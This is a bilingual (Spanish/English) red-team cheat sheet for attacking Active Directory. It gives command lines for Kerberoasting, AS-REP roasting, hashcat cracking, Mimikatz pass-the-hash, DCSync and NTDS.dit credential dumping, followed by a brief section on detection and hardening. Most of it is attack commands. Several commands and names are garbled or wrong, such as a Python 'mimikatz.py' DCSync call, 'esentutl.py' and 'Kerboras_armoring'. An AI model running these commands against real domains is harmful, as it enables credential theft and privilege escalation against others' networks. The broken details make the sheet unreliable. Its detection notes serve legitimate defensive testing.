---
title: Active Directory Abuse
phase: explotacion
platform: ad
tags: [ad, kerberoast, aspass-the-hash, delegation]
risk: critical
attack_tactic: TA0006
attack_technique: T1558
data_sources: [ldap-traffic, kerberos-logs, security-events]
last_review: 2026-05-25
---

# Active Directory Abuse

### Objetivo

Explotar debilidades en AD para obtener credenciales, movimiento lateral, y escalación de privilegios.

### Kerberoasting

```bash
# Request TGS with Impacket
python GetUserSPNs.py domain.local/user:password -dc-ip dc01 -outputfile kerberoast.txt

# Crack with hashcat
hashcat -m 13100 kerberoast.txt wordlist.txt

# Rubeus kerberoast
Rubeus.exe kerberoast /outfile:hashes.txt
```

### AS-REP Roasting

```bash
# Get users with RC4 preauth disabled
python GetNPUsers.py domain.local/ -dc-ip dc01 -usersfile users.txt

# Hashcat cracking
hashcat -m 18200 hashes.txt wordlist.txt
```

### Pass-the-Hash

```bash
# Overpass the hash (PtH + pass the ticket)
python secretsdump.py -k target@target.com
wmiexec.py -k target@target.com

# Mimikatz PtH
mimikatz.exe "sekurlsa::pth /user:admin /rc4:NTLMHASH /domain:domain.local"
```

### Credential Dumping from AD

```bash
# DCSync (needs domain admin)
python mimikatz.py -k domain.local -dc-ip dc01 -M DCSync

# secretsdump remote
python secretsdump.py domain/user:password@target

# NTDS.dit extraction
python esentutl.py /S /f ntds.dit /s /o
```

### One-liners

```bash
# Check for constrained delegation
python GetDelegation.py domain.local/user:password -dc-ip dc01

# Unconstrained delegation workstations
python FindDelegation.py domain.local/user:password -dc-ip dc01

# Enum SPNs manually
powershell -Command "Get-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName"
```

### Detección y Mitigación

- **Visibilidad:** Security Event 4769 (TGS request), 4768 (TGT request), 4624, Sysmon EID 1 (process creation); monitor for anómalo golden ticket.
- **Hardening:** Habilitar AES encryption, Kerboras_armoring, disable RC4, protección contra PtH via Protected Users group.

### Validación de Cobertura

- **Prueba técnica:** Kerberoasting attack in lab.
- **Criterio de éxito:** Alert on mass TGS requests; detect when service account password is cracked.
